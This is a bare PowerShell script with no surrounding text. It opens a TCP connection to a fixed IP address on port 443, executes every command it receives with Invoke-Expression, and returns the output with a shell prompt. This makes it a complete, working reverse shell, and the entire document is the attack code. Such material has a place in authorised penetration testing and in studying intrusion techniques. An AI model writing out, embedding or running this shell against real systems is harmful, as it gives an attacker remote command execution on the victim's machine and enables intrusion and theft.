<
$ip = "192.168.160.128"; $port = 443
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | %{0}
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
    $output = (iex $cmd 2>&1 | Out-String)
    $response = $output + "PS " + (pwd).Path + "> "
    $responseBytes = [System.Text.Encoding]::ASCII.GetBytes($response)
    $stream.Write($responseBytes, 0, $responseBytes.Length)
}
$client.Close()
>




